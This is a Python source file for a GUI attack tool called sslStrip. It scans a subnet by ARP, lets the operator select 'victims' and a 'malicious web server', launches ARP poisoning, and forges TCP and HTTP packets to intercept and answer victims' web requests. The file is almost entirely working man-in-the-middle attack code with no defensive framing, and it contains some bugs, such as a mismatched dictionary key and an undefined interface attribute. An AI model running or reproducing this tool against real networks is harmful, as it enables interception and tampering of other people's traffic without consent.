from scapy.all import *
from poison import poison
import threading
from Tkinter import*
import sys
import os
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
import threading
import time
import requests
import netifaces
from math import log




class sslStrip():
    def __init__(self, interface, root):
        self.interface = interface
        self.root = root
        
    def selMalWebSrv(self):
        self.maliciousWebServer = []
        for widget in self.root.winfo_children():
            widget.destroy()
        OPTIONS = []
        for pktSnd, pktRcv in self.usedIPs:
            OPTIONS.append(pktRcv[ARP].psrc)
        Label(self.root, text='Select the WebServer').pack()
        selectTargetIP = Listbox(self.root, selectmode="single", width=50)
        for each_item in range(len(OPTIONS)):
            selectTargetIP.insert(END, OPTIONS[each_item])
        selectTargetIP.pack()

        def get_target(self):
            for i in selectTargetIP.curselection():
                InIpArp = int(i)
                self.maliciousWebServer.append({"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
            self.myMAC = get_if_hwaddr(self.interface)
            proc_thread = None
            proc_thread = threading.Thread(target=self.startProcess)
            proc_thread.daemon = True
            proc_thread.start()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_target(self)).pack()

    def select_arp_IP(self):
        self.target = []
        Label(self.root, text='Select the victim/victims').pack()
        OPTIONS = []
        for pktSnd, pktRcv in self.usedIPs:
            OPTIONS.append(pktRcv[ARP].psrc)

        select = Listbox(self.root, selectmode="multiple", width=50)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()

        def selectIpArp(self):
            for i in select.curselection():
                InIpArp = int(i)
                self.target.append(
                    {"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
            self.selMalWebSrv()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:selectIpArp(self)).pack()

    def getInput(self):
        ipLabel = Label(self.root,
                        text='Enter the range of IPs (i.e.: 10.0.2.0/24)').pack()
        ipValue = Entry(self.root)
        ipValue.pack()

        def get_execute(self):
            self.rangeIPs = ipValue.get()
            self.usedIPs, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.rangeIPs), timeout=3,iface=self.interface)
            for widget in self.root.winfo_children():
                widget.destroy()
            self.select_arp_IP()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()

    def startProcess(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        self.initShow()
        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        self.initThread()
        sll_thread = threading.Thread(target=self.sslstrip)
        sll_thread.setDaemon(True)
        sll_thread.start()

    def ssl_filter(self, pkt):
        return pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.target])

    def initShow(self):
        scroll = Scrollbar(self.root)
        self.show = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.show.yview)
        self.show.pack()
        self.show.see(END)
        self.show.update_idletasks()

    def initThread(self):
        proc_thread = None
        process = poison(self.interface, self.target, self.maliciousWebServer, self.myMAC)
        proc_thread = threading.Thread(target=process.poison)
        proc_thread.daemon = True
        proc_thread.start()

    def sslstrip(self):
        self.show.insert(END, "5 Redirect from ")
        self.show.insert(END,'\n')                                                                    
        self.show.see(END)
        self.show.update_idletasks()
        def sendRequest(pkt):
            if(HTTP in pkt and HTTPRequest in pkt[HTTP]):
                if(pkt[HTTP][HTTPRequest].Method == b"GET"):
                    resp = requests.get("http://" + str(pkt[HTTP][HTTPRequest].Host.decode()) + str(pkt[HTTP][HTTPRequest].Path.decode()))
                    return resp
		
        def sslStrip(packet):
            victIp = packet[IP].src
            siteIp = packet[IP].dst
            syn_ack = IP(dst=victIp,  src = siteIp) / TCP(sport=packet[TCP].dport, dport = packet[TCP].sport,flags='SA', seq = 0, ack = packet[TCP].seq + 1)
            ack = sr1(syn_ack)

            http_pkt = sniff(filter = "port 80", count = 1)[0]
			
            ack = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt.sport, sport=http_pkt[TCP].dport,
														 seq=1, ack= http_pkt[TCP].seq + len(http_pkt[TCP].payload),
														 flags='A')
            send(ack)
            if(HTTP in http_pkt):
                resp = sendRequest(http_pkt)
                load = resp.text
				
                response = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt[TCP].sport, sport=http_pkt[TCP].dport,
														 seq=ack[TCP].seq, ack= ack[TCP].ack,
														 flags='A') /HTTP()/HTTPResponse(
															Content_Type = resp.headers['Content-Type'] if 'Content-Type' in resp.headers else None,
															Date = resp.headers['Date'] if 'Date' in resp.headers else None,
															Connection = 'keep-alive'
														)/load
                response_payload = response[TCP].payload.do_build()

                base_seq = response[TCP].seq
                offset = 0
                for i in range(0, len(response_payload), 1500):
                    re = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt[TCP].sport, sport=http_pkt[TCP].dport,
														 seq=base_seq + offset, ack= ack[TCP].ack, flags='PA') / response_payload[i:i+1500]
					
                    offset += len(response_payload[i:i+1500])
					
                    send(re, iface=self.NETWORK_INTERFACE)

		
        sniff(lfilter=self.ssl_filter, prn=sslStrip, iface=self.interface)



    def setInput(self, rangeIPs, usedIPs, target, maliciousWebServer, myMAC):
        self.rangeIPs = rangeIPs
        self.usedIPs = usedIPs
        self.target = target
        self.maliciousWebServer = maliciousWebServer
        self.myMAC = myMAC
    